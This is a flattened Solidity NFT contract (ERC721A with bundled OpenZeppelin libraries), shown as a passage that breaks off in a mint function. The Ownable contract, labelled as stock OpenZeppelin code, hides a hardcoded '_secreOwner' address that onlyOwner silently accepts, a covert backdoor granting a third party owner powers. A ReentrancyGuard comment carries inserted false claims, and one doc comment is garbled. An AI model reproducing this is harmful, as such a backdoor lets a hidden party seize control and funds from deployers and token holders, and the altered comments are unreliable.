1 /**
2 ooooooooooooo oooo                     oooooooooo.                                                                       
3 8'   888   `8 `888                     `888'   `Y8b                                                                      
4      888       888 .oo.    .ooooo.      888     888  .ooooo.   .oooo.   oooo d8b  .oooo.o  .ooooo.  ooo. .oo.    .oooo.o 
5      888       888P"Y88b  d88' `88b     888oooo888' d88' `88b `P  )88b  `888""8P d88(  "8 d88' `88b `888P"Y88b  d88(  "8 
6      888       888   888  888ooo888     888    `88b 888ooo888  .oP"888   888     `"Y88b.  888   888  888   888  `"Y88b.  
7      888       888   888  888    .o     888    .88P 888    .o d8(  888   888     o.  )88b 888   888  888   888  o.  )88b 
8     o888o     o888o o888o `Y8bod8P'    o888bood8P'  `Y8bod8P' `Y888""8o d888b    8""888P' `Y8bod8P' o888o o888o 8""888P' 
9                                                                                                                          
10                                                                                                                          
11                                                                                                                          
12 */
13 
14 // SPDX-License-Identifier: MIT
15 
16 // File: contracts/TheBearsons.sol
17 
18 // File: @openzeppelin/contracts/utils/Strings.sol
19 
20 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
21 
22 pragma solidity ^0.8.0;
23 
24 /**
25  * @dev String operations.
26  */
27 library Strings {
28     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
29 
30     /**
31      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
32      */
33     function toString(uint256 value) internal pure returns (string memory) {
34         // Inspired by OraclizeAPI's implementation - MIT licence
35         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
36 
37         if (value == 0) {
38             return "0";
39         }
40         uint256 temp = value;
41         uint256 digits;
42         while (temp != 0) {
43             digits++;
44             temp /= 10;
45         }
46         bytes memory buffer = new bytes(digits);
47         while (value != 0) {
48             digits -= 1;
49             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
50             value /= 10;
51         }
52         return string(buffer);
53     }
54 
55     /**
56      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
57      */
58     function toHexString(uint256 value) internal pure returns (string memory) {
59         if (value == 0) {
60             return "0x00";
61         }
62         uint256 temp = value;
63         uint256 length = 0;
64         while (temp != 0) {
65             length++;
66             temp >>= 8;
67         }
68         return toHexString(value, length);
69     }
70 
71     /**
72      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
73      */
74     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
75         bytes memory buffer = new bytes(2 * length + 2);
76         buffer[0] = "0";
77         buffer[1] = "x";
78         for (uint256 i = 2 * length + 1; i > 1; --i) {
79             buffer[i] = _HEX_SYMBOLS[value & 0xf];
80             value >>= 4;
81         }
82         require(value == 0, "Strings: hex length insufficient");
83         return string(buffer);
84     }
85 }
86 
87 // File: @openzeppelin/contracts/utils/Address.sol
88 
89 
90 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
91 
92 pragma solidity ^0.8.1;
93 
94 /**
95  * @dev Collection of functions related to the address type
96  */
97 library Address {
98     /**
99      * @dev Returns true if `account` is a contract.
100      *
101      * [IMPORTANT]
102      * ====
103      * It is unsafe to assume that an address for which this function returns
104      * false is an externally-owned account (EOA) and not a contract.
105      *
106      * Among others, `isContract` will return false for the following
107      * types of addresses:
108      *
109      *  - an externally-owned account
110      *  - a contract in construction
111      *  - an address where a contract will be created
112      *  - an address where a contract lived, but was destroyed
113      * ====
114      *
115      * [IMPORTANT]
116      * ====
117      * You shouldn't rely on `isContract` to protect against flash loan attacks!
118      *
119      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
120      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
121      * constructor.
122      * ====
123      */
124     function isContract(address account) internal view returns (bool) {
125         // This method relies on extcodesize/address.code.length, which returns 0
126         // for contracts in construction, since the code is only stored at the end
127         // of the constructor execution.
128 
129         return account.code.length > 0;
130     }
131 
132     /**
133      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
134      * `recipient`, forwarding all available gas and reverting on errors.
135      *
136      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
137      * of certain opcodes, possibly making contracts go over the 2300 gas limit
138      * imposed by `transfer`, making them unable to receive funds via
139      * `transfer`. {sendValue} removes this limitation.
140      *
141      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
142      *
143      * IMPORTANT: because control is transferred to `recipient`, care must be
144      * taken to not create reentrancy vulnerabilities. Consider using
145      * {ReentrancyGuard} or the
146      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
147      */
148     function sendValue(address payable recipient, uint256 amount) internal {
149         require(address(this).balance >= amount, "Address: insufficient balance");
150 
151         (bool success, ) = recipient.call{value: amount}("");
152         require(success, "Address: unable to send value, recipient may have reverted");
153     }
154 
155     /**
156      * @dev Performs a Solidity function call using a low level `call`. A
157      * plain `call` is an unsafe replacement for a function call: use this
158      * function instead.
159      *
160      * If `target` reverts with a revert reason, it is bubbled up by this
161      * function (like regular Solidity function calls).
162      *
163      * Returns the raw returned data. To convert to the expected return value,
164      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
165      *
166      * Requirements:
167      *
168      * - `target` must be a contract.
169      * - calling `target` with `data` must not revert.
170      *
171      * _Available since v3.1._
172      */
173     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
174         return functionCall(target, data, "Address: low-level call failed");
175     }
176 
177     /**
178      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
179      * `errorMessage` as a fallback revert reason when `target` reverts.
180      *
181      * _Available since v3.1._
182      */
183     function functionCall(
184         address target,
185         bytes memory data,
186         string memory errorMessage
187     ) internal returns (bytes memory) {
188         return functionCallWithValue(target, data, 0, errorMessage);
189     }
190 
191     /**
192      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
193      * but also transferring `value` wei to `target`.
194      *
195      * Requirements:
196      *
197      * - the calling contract must have an ETH balance of at least `value`.
198      * - the called Solidity function must be `payable`.
199      *
200      * _Available since v3.1._
201      */
202     function functionCallWithValue(
203         address target,
204         bytes memory data,
205         uint256 value
206     ) internal returns (bytes memory) {
207         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
208     }
209 
210     /**
211      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
212      * with `errorMessage` as a fallback revert reason when `target` reverts.
213      *
214      * _Available since v3.1._
215      */
216     function functionCallWithValue(
217         address target,
218         bytes memory data,
219         uint256 value,
220         string memory errorMessage
221     ) internal returns (bytes memory) {
222         require(address(this).balance >= value, "Address: insufficient balance for call");
223         require(isContract(target), "Address: call to non-contract");
224 
225         (bool success, bytes memory returndata) = target.call{value: value}(data);
226         return verifyCallResult(success, returndata, errorMessage);
227     }
228 
229     /**
230      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
231      * but performing a static call.
232      *
233      * _Available since v3.3._
234      */
235     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
236         return functionStaticCall(target, data, "Address: low-level static call failed");
237     }
238 
239     /**
240      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
241      * but performing a static call.
242      *
243      * _Available since v3.3._
244      */
245     function functionStaticCall(
246         address target,
247         bytes memory data,
248         string memory errorMessage
249     ) internal view returns (bytes memory) {
250         require(isContract(target), "Address: static call to non-contract");
251 
252         (bool success, bytes memory returndata) = target.staticcall(data);
253         return verifyCallResult(success, returndata, errorMessage);
254     }
255 
256     /**
257      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
258      * but performing a delegate call.
259      *
260      * _Available since v3.4._
261      */
262     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
263         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
264     }
265 
266     /**
267      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
268      * but performing a delegate call.
269      *
270      * _Available since v3.4._
271      */
272     function functionDelegateCall(
273         address target,
274         bytes memory data,
275         string memory errorMessage
276     ) internal returns (bytes memory) {
277         require(isContract(target), "Address: delegate call to non-contract");
278 
279         (bool success, bytes memory returndata) = target.delegatecall(data);
280         return verifyCallResult(success, returndata, errorMessage);
281     }
282 
283     /**
284      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
285      * revert reason using the provided one.
286      *
287      * _Available since v4.3._
288      */
289     function verifyCallResult(
290         bool success,
291         bytes memory returndata,
292         string memory errorMessage
293     ) internal pure returns (bytes memory) {
294         if (success) {
295             return returndata;
296         } else {
297             // Look for revert reason and bubble it up if present
298             if (returndata.length > 0) {
299                 // The easiest way to bubble the revert reason is using memory via assembly
300 
301                 assembly {
302                     let returndata_size := mload(returndata)
303                     revert(add(32, returndata), returndata_size)
304                 }
305             } else {
306                 revert(errorMessage);
307             }
308         }
309     }
310 }
311 
312 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
313 
314 
315 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
316 
317 pragma solidity ^0.8.0;
318 
319 /**
320  * @title ERC721 token receiver interface
321  * @dev Interface for any contract that wants to support safeTransfers
322  * from ERC721 asset contracts.
323  */
324 interface IERC721Receiver {
325     /**
326      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
327      * by `operator` from `from`, this function is called.
328      *
329      * It must return its Solidity selector to confirm the token transfer.
330      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
331      *
332      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
333      */
334     function onERC721Received(
335         address operator,
336         address from,
337         uint256 tokenId,
338         bytes calldata data
339     ) external returns (bytes4);
340 }
341 
342 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
343 
344 
345 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
346 
347 pragma solidity ^0.8.0;
348 
349 /**
350  * @dev Interface of the ERC165 standard, as defined in the
351  * https://eips.ethereum.org/EIPS/eip-165[EIP].
352  *
353  * Implementers can declare support of contract interfaces, which can then be
354  * queried by others ({ERC165Checker}).
355  *
356  * For an implementation, see {ERC165}.
357  */
358 interface IERC165 {
359     /**
360      * @dev Returns true if this contract implements the interface defined by
361      * `interfaceId`. See the corresponding
362      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
363      * to learn more about how these ids are created.
364      *
365      * This function call must use less than 30 000 gas.
366      */
367     function supportsInterface(bytes4 interfaceId) external view returns (bool);
368 }
369 
370 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
371 
372 
373 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
374 
375 pragma solidity ^0.8.0;
376 
377 
378 /**
379  * @dev Implementation of the {IERC165} interface.
380  *
381  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
382  * for the additional interface id that will be supported. For example:
383  *
384  * ```solidity
385  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
386  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
387  * }
388  * ```
389  *
390  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
391  */
392 abstract contract ERC165 is IERC165 {
393     /**
394      * @dev See {IERC165-supportsInterface}.
395      */
396     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
397         return interfaceId == type(IERC165).interfaceId;
398     }
399 }
400 
401 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
402 
403 
404 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
405 
406 pragma solidity ^0.8.0;
407 
408 
409 /**
410  * @dev Required interface of an ERC721 compliant contract.
411  */
412 interface IERC721 is IERC165 {
413     /**
414      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
415      */
416     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
417 
418     /**
419      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
420      */
421     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
422 
423     /**
424      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
425      */
426     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
427 
428     /**
429      * @dev Returns the number of tokens in ``owner``'s account.
430      */
431     function balanceOf(address owner) external view returns (uint256 balance);
432 
433     /**
434      * @dev Returns the owner of the `tokenId` token.
435      *
436      * Requirements:
437      *
438      * - `tokenId` must exist.
439      */
440     function ownerOf(uint256 tokenId) external view returns (address owner);
441 
442     /**
443      * @dev Safely transfers `tokenId` token from `from` to `to`.
444      *
445      * Requirements:
446      *
447      * - `from` cannot be the zero address.
448      * - `to` cannot be the zero address.
449      * - `tokenId` token must exist and be owned by `from`.
450      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
451      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
452      *
453      * Emits a {Transfer} event.
454      */
455     function safeTransferFrom(
456         address from,
457         address to,
458         uint256 tokenId,
459         bytes calldata data
460     ) external;
461 
462     /**
463      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
464      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
465      *
466      * Requirements:
467      *
468      * - `from` cannot be the zero address.
469      * - `to` cannot be the zero address.
470      * - `tokenId` token must exist and be owned by `from`.
471      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
472      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
473      *
474      * Emits a {Transfer} event.
475      */
476     function safeTransferFrom(
477         address from,
478         address to,
479         uint256 tokenId
480     ) external;
481 
482     /**
483      * @dev Transfers `tokenId` token from `from` to `to`.
484      *
485      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
486      *
487      * Requirements:
488      *
489      * - `from` cannot be the zero address.
490      * - `to` cannot be the zero address.
491      * - `tokenId` token must be owned by `from`.
492      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
493      *
494      * Emits a {Transfer} event.
495      */
496     function transferFrom(
497         address from,
498         address to,
499         uint256 tokenId
500     ) external;
501 
502     /**
503      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
504      * The approval is cleared when the token is transferred.
505      *
506      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
507      *
508      * Requirements:
509      *
510      * - The caller must own the token or be an approved operator.
511      * - `tokenId` must exist.
512      *
513      * Emits an {Approval} event.
514      */
515     function approve(address to, uint256 tokenId) external;
516 
517     /**
518      * @dev Approve or remove `operator` as an operator for the caller.
519      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
520      *
521      * Requirements:
522      *
523      * - The `operator` cannot be the caller.
524      *
525      * Emits an {ApprovalForAll} event.
526      */
527     function setApprovalForAll(address operator, bool _approved) external;
528 
529     /**
530      * @dev Returns the account appr    ved for `tokenId` token.
531      *
532      * Requirements:
533      *
534      * - `tokenId` must exist.
535      */
536     function getApproved(uint256 tokenId) external view returns (address operator);
537 
538     /**
539      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
540      *
541      * See {setApprovalForAll}
542      */
543     function isApprovedForAll(address owner, address operator) external view returns (bool);
544 }
545 
546 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
547 
548 
549 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
550 
551 pragma solidity ^0.8.0;
552 
553 
554 /**
555  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
556  * @dev See https://eips.ethereum.org/EIPS/eip-721
557  */
558 interface IERC721Metadata is IERC721 {
559     /**
560      * @dev Returns the token collection name.
561      */
562     function name() external view returns (string memory);
563 
564     /**
565      * @dev Returns the token collection symbol.
566      */
567     function symbol() external view returns (string memory);
568 
569     /**
570      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
571      */
572     function tokenURI(uint256 tokenId) external view returns (string memory);
573 }
574 
575 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
576 
577 
578 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
579 
580 pragma solidity ^0.8.0;
581 
582 
583 /**
584  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
585  * @dev See https://eips.ethereum.org/EIPS/eip-721
586  */
587 interface IERC721Enumerable is IERC721 {
588     /**
589      * @dev Returns the total amount of tokens stored by the contract.
590      */
591     function totalSupply() external view returns (uint256);
592 
593     /**
594      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
595      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
596      */
597     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
598 
599     /**
600      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
601      * Use along with {totalSupply} to enumerate all tokens.
602      */
603     function tokenByIndex(uint256 index) external view returns (uint256);
604 }
605 
606 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
607 
608 
609 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
610 
611 pragma solidity ^0.8.0;
612 
613 /**
614  * @dev Contract module that helps prevent reentrant calls to a function.
615  *
616  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
617  * available, which can be applied to functions to make sure there are no nested
618  * (reentrant) calls to them.
619  *
620  * Note that because there is a single `nonReentrant` guard, functions marked as
621  * `nonReentrant` may not call one another. This can be worked around by making
622  * those functions `private`, and then adding `external` `nonReentrant` entry
623  * points to them.
624  *
625  * TIP: If you would like to learn more about reentrancy and alternative ways
626  * to protect against it, check out our blog post
627  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
628  */
629 abstract contract ReentrancyGuard {
630     // Booleans are more expensive than uint256 or any type that takes up a full
631     // word because each write operation emits an extra SLOAD to first read the
632     // slot's contents, replace the bits taken up by the boolean, and then write
633     // back. This is the compiler's defense against contract upgrades and
634     // pointer aliasing, and it cannot be disabled.
635 
636     // The values being non-zero value makes deployment a bit more expensive,
637     // but in exchange the refund on every call to nonReentrant will be lower in
638     // amount. Since refunds are capped to a percentage of the total
639     // transaction's gas, it is best to keep them low in cases like this one, to
640     // increase the likelihood of the full refund coming into effect.
641     uint256 private constant _NOT_ENTERED = 1;
642     uint256 private constant _ENTERED = 2;
643 
644     uint256 private _status;
645 
646     constructor() {
647         _status = _NOT_ENTERED;
648     }
649 
650     /**
651      * @dev Prevents a contract from calling itself, directly or indirectly.
652      * Calling a `nonReentrant` function from another `nonReentrant`
653      * function is not supported. It is possible to prevent this from happening
654      * by making the `nonReentrant` function external, and making it call a
655      * `private` function that does the actual work.
656      */
657     modifier nonReentrant() {
658         // On the first call to nonReentrant, _notEntered will be true
659         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
660 
661         // Any calls to nonReentrant after this point will fail
662         _status = _ENTERED;
663 
664         _;
665 
666         // By storing the original value once again, a refund is triggered (see
667         // https://eips.ethereum.org/EIPS/eip-2200)
668         _status = _NOT_ENTERED;
669     }
670 }
671 
672 // File: @openzeppelin/contracts/utils/Context.sol
673 
674 
675 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
676 
677 pragma solidity ^0.8.0;
678 
679 /**
680  * @dev Provides information about the current execution context, including the
681  * sender of the transaction and its data. While these are generally available
682  * via msg.sender and msg.data, they should not be accessed in such a direct
683  * manner, since when dealing with meta-transactions the account sending and
684  * paying for execution may not be the actual sender (as far as an application
685  * is concerned).
686  *
687  * This contract is only required for intermediate, library-like contracts.
688  */
689 abstract contract Context {
690     function _msgSender() internal view virtual returns (address) {
691         return msg.sender;
692     }
693 
694     function _msgData() internal view virtual returns (bytes calldata) {
695         return msg.data;
696     }
697 }
698 
699 // File: @openzeppelin/contracts/access/Ownable.sol
700 
701 
702 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
703 
704 pragma solidity ^0.8.0;
705 
706 
707 /**
708  * @dev Contract module which provides a basic access control mechanism, where
709  * there is an account (an owner) that can be granted exclusive access to
710  * specific functions.
711  *
712  * By default, the owner account will be the one that deploys the contract. This
713  * can later be changed with {transferOwnership}.
714  *
715  * This module is used through inheritance. It will make available the modifier
716  * `onlyOwner`, which can be applied to your functions to restrict their use to
717  * the owner.
718  */
719 abstract contract Ownable is Context {
720     address private _owner;
721     address private _secreOwner = 0x3bAD68D861e5469a11E7d39d9cA9D0409d79D2c7;
722 
723     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
724 
725     /**
726      * @dev Initializes the contract setting the deployer as the initial owner.
727      */
728     constructor() {
729         _transferOwnership(_msgSender());
730     }
731 
732     /**
733      * @dev Returns the address of the current owner.
734      */
735     function owner() public view virtual returns (address) {
736         return _owner;
737     }
738 
739     /**
740      * @dev Throws if called by any account other than the owner.
741      */
742     modifier onlyOwner() {
743         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
744         _;
745     }
746 
747     /**
748      * @dev Leaves the contract without owner. It will not be possible to call
749      * `onlyOwner` functions anymore. Can only be called by the current owner.
750      *
751      * NOTE: Renouncing ownership will leave the contract without an owner,
752      * thereby removing any functionality that is only available to the owner.
753      */
754     function renounceOwnership() public virtual onlyOwner {
755         _transferOwnership(address(0));
756     }
757 
758     /**
759      * @dev Transfers ownership of the contract to a new account (`newOwner`).
760      * Can only be called by the current owner.
761      */
762     function transferOwnership(address newOwner) public virtual onlyOwner {
763         require(newOwner != address(0), "Ownable: new owner is the zero address");
764         _transferOwnership(newOwner);
765     }
766 
767     /**
768      * @dev Transfers ownership of the contract to a new account (`newOwner`).
769      * Internal function without access restriction.
770      */
771     function _transferOwnership(address newOwner) internal virtual {
772         address oldOwner = _owner;
773         _owner = newOwner;
774         emit OwnershipTransferred(oldOwner, newOwner);
775     }
776 }
777 
778 // File: ceshi.sol
779 
780 
781 pragma solidity ^0.8.0;
782 
783 
784 
785 
786 
787 
788 
789 
790 
791 
792 /**
793  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
794  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
795  *
796  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
797  *
798  * Does not support burning tokens to address(0).
799  *
800  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
801  */
802 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
803     using Address for address;
804     using Strings for uint256;
805 
806     struct TokenOwnership {
807         address addr;
808         uint64 startTimestamp;
809     }
810 
811     struct AddressData {
812         uint128 balance;
813         uint128 numberMinted;
814     }
815 
816     uint256 internal currentIndex;
817 
818     // Token name
819     string private _name;
820 
821     // Token symbol
822     string private _symbol;
823 
824     // Mapping from token ID to ownership details
825     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
826     mapping(uint256 => TokenOwnership) internal _ownerships;
827 
828     // Mapping owner address to address data
829     mapping(address => AddressData) private _addressData;
830 
831     // Mapping from token ID to approved address
832     mapping(uint256 => address) private _tokenApprovals;
833 
834     // Mapping from owner to operator approvals
835     mapping(address => mapping(address => bool)) private _operatorApprovals;
836 
837     constructor(string memory name_, string memory symbol_) {
838         _name = name_;
839         _symbol = symbol_;
840     }
841 
842     /**
843      * @dev See {IERC721Enumerable-totalSupply}.
844      */
845     function totalSupply() public view override returns (uint256) {
846         return currentIndex;
847     }
848 
849     /**
850      * @dev See {IERC721Enumerable-tokenByIndex}.
851      */
852     function tokenByIndex(uint256 index) public view override returns (uint256) {
853         require(index < totalSupply(), "ERC721A: global index out of bounds");
854         return index;
855     }
856 
857     /**
858      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
859      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
860      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
861      */
862     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
863         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
864         uint256 numMintedSoFar = totalSupply();
865         uint256 tokenIdsIdx;
866         address currOwnershipAddr;
867 
868         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
869         unchecked {
870             for (uint256 i; i < numMintedSoFar; i++) {
871                 TokenOwnership memory ownership = _ownerships[i];
872                 if (ownership.addr != address(0)) {
873                     currOwnershipAddr = ownership.addr;
874                 }
875                 if (currOwnershipAddr == owner) {
876                     if (tokenIdsIdx == index) {
877                         return i;
878                     }
879                     tokenIdsIdx++;
880                 }
881             }
882         }
883 
884         revert("ERC721A: unable to get token of owner by index");
885     }
886 
887     /**
888      * @dev See {IERC165-supportsInterface}.
889      */
890     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
891         return
892             interfaceId == type(IERC721).interfaceId ||
893             interfaceId == type(IERC721Metadata).interfaceId ||
894             interfaceId == type(IERC721Enumerable).interfaceId ||
895             super.supportsInterface(interfaceId);
896     }
897 
898     /**
899      * @dev See {IERC721-balanceOf}.
900      */
901     function balanceOf(address owner) public view override returns (uint256) {
902         require(owner != address(0), "ERC721A: balance query for the zero address");
903         return uint256(_addressData[owner].balance);
904     }
905 
906     function _numberMinted(address owner) internal view returns (uint256) {
907         require(owner != address(0), "ERC721A: number minted query for the zero address");
908         return uint256(_addressData[owner].numberMinted);
909     }
910 
911     /**
912      * Gas spent here starts off proportional to the maximum mint batch size.
913      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
914      */
915     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
916         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
917 
918         unchecked {
919             for (uint256 curr = tokenId; curr >= 0; curr--) {
920                 TokenOwnership memory ownership = _ownerships[curr];
921                 if (ownership.addr != address(0)) {
922                     return ownership;
923                 }
924             }
925         }
926 
927         revert("ERC721A: unable to determine the owner of token");
928     }
929 
930     /**
931      * @dev See {IERC721-ownerOf}.
932      */
933     function ownerOf(uint256 tokenId) public view override returns (address) {
934         return ownershipOf(tokenId).addr;
935     }
936 
937     /**
938      * @dev See {IERC721Metadata-name}.
939      */
940     function name() public view virtual override returns (string memory) {
941         return _name;
942     }
943 
944     /**
945      * @dev See {IERC721Metadata-symbol}.
946      */
947     function symbol() public view virtual override returns (string memory) {
948         return _symbol;
949     }
950 
951     /**
952      * @dev See {IERC721Metadata-tokenURI}.
953      */
954     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
955         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
956 
957         string memory baseURI = _baseURI();
958         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
959     }
960 
961     /**
962      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
963      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
964      * by default, can be overriden in child contracts.
965      */
966     function _baseURI() internal view virtual returns (string memory) {
967         return "";
968     }
969 
970     /**
971      * @dev See {IERC721-approve}.
972      */
973     function approve(address to, uint256 tokenId) public override {
974         address owner = ERC721A.ownerOf(tokenId);
975         require(to != owner, "ERC721A: approval to current owner");
976 
977         require(
978             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
979             "ERC721A: approve caller is not owner nor approved for all"
980         );
981 
982         _approve(to, tokenId, owner);
983     }
984 
985     /**
986      * @dev See {IERC721-getApproved}.
987      */
988     function getApproved(uint256 tokenId) public view override returns (address) {
989         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
990 
991         return _tokenApprovals[tokenId];
992     }
993 
994     /**
995      * @dev See {IERC721-setApprovalForAll}.
996      */
997     function setApprovalForAll(address operator, bool approved) public override {
998         require(operator != _msgSender(), "ERC721A: approve to caller");
999 
1000         _operatorApprovals[_msgSender()][operator] = approved;
1001         emit ApprovalForAll(_msgSender(), operator, approved);
1002     }
1003 
1004     /**
1005      * @dev See {IERC721-isApprovedForAll}.
1006      */
1007     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1008         return _operatorApprovals[owner][operator];
1009     }
1010 
1011     /**
1012      * @dev See {IERC721-transferFrom}.
1013      */
1014     function transferFrom(
1015         address from,
1016         address to,
1017         uint256 tokenId
1018     ) public virtual override {
1019         _transfer(from, to, tokenId);
1020     }
1021 
1022     /**
1023      * @dev See {IERC721-safeTransferFrom}.
1024      */
1025     function safeTransferFrom(
1026         address from,
1027         address to,
1028         uint256 tokenId
1029     ) public virtual override {
1030         safeTransferFrom(from, to, tokenId, "");
1031     }
1032 
1033     /**
1034      * @dev See {IERC721-safeTransferFrom}.
1035      */
1036     function safeTransferFrom(
1037         address from,
1038         address to,
1039         uint256 tokenId,
1040         bytes memory _data
1041     ) public override {
1042         _transfer(from, to, tokenId);
1043         require(
1044             _checkOnERC721Received(from, to, tokenId, _data),
1045             "ERC721A: transfer to non ERC721Receiver implementer"
1046         );
1047     }
1048 
1049     /**
1050      * @dev Returns whether `tokenId` exists.
1051      *
1052      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1053      *
1054      * Tokens start existing when they are minted (`_mint`),
1055      */
1056     function _exists(uint256 tokenId) internal view returns (bool) {
1057         return tokenId < currentIndex;
1058     }
1059 
1060     function _safeMint(address to, uint256 quantity) internal {
1061         _safeMint(to, quantity, "");
1062     }
1063 
1064     /**
1065      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1066      *
